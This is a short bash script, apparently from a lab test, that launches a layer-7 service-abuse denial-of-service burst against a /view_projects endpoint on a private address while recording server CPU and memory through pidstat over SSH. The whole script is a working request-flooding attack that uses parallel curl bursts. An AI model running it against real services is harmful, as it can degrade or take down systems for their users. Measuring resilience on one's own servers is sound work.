#!/usr/bin/env bash
# BURST — Service-Abuse DoS (L7): /view_projects
# Includes remote pidstat capture on target server

set -euo pipefail

ATTACKER_BASE="http://192.168.42.8:5000"
TARGET_SSH="angel@192.168.42.8"

OUT_ATTACKER="$HOME/ADL-TEST-GUARD/reports-area"
mkdir -p "$OUT_ATTACKER"

# Burst tuning
BURSTS=20
BURST_SIZE=40
PARALLEL=10
SLEEP_BETWEEN=1

ts="$(date +%Y%m%d_%H%M%S)"
ATTACK_LOG="$OUT_ATTACKER/service_abuse_view_projects_${ts}.csv"

# Remote pidstat output (on server)
REMOTE_LOG="/home/angel/service_abuse_view_projects_pidstat_${ts}.log"

echo "timestamp,endpoint,http_code,time_total" > "$ATTACK_LOG"

echo "▶ Starting pidstat on target server"
ssh "$TARGET_SSH" "pidstat -u -r -d -h 1 > $REMOTE_LOG" &
PIDSTAT_SSH_PID=$!

sleep 2  # give pidstat time to start

echo "▶ Launching service-abuse bursts"
for b in $(seq 1 "$BURSTS"); do
  for i in $(seq 1 "$BURST_SIZE"); do
    {
      curl -s -o /dev/null \
        -w "$(date +%s),/view_projects,%{http_code},%{time_total}\n" \
        "$ATTACKER_BASE/view_projects"
    } &
    (( i % PARALLEL == 0 )) && wait
  done
  wait
  sleep "$SLEEP_BETWEEN"
done

echo "▶ Stopping pidstat"
ssh "$TARGET_SSH" "pkill -f 'pidstat -u -r -d -h 1'"

echo "✅ Attack complete"
echo "• Client log: $ATTACK_LOG"
echo "• Server log: $REMOTE_LOG"
